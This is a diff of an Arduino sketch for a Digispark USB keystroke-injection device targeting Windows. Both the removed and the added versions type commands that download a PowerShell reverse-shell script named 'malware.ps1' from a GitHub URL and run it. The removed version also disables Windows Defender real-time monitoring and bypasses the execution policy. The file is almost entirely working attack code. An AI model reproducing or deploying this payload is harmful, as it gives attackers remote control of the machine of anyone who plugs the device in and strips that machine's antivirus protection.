@@ -1,47 +1,27 @@
+
 #include <DigiKeyboard.h>
-#include <DigiKeyboardDe.h>
-#include <oddebug.h>
-#include <osccal.h>
-#include <osctune.h>
-#include <scancode-ascii-table.h>
-#include <usbconfig-prototype.h>
-#include <usbconfig.h>
-#include <usbdrv.h>
-#include <usbportability.h>
 
 void setup() {
   // put your setup code here, to run once:
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_X, MOD_GUI_RIGHT);
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_UP);
-  DigiKeyboardDe.delay(100);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.delay(1000);
-  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell Invoke-WebRequest  -Uri 'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Linux-Smart-Client-Side-Script-ReverseShell.ps1' -OutFile malware.ps1");
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.println("powershell Set-MpPreference -DisableRealtimeMonitoring $true");
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.println("powershell -ExecutionPolicy ByPass -File malware.ps1");
-  DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.delay(500);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_RIGHT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("cmd");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("cd / & mkdir win & cd /win & powershell Invoke-WebRequest  -Uri 'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Client-Side-Script-ReversePowershell.ps1' -OutFile malware.ps1");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println(".\malware.ps1");
+  DigiKeyboard.delay(500);
+   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
 }
 
 void loop() {
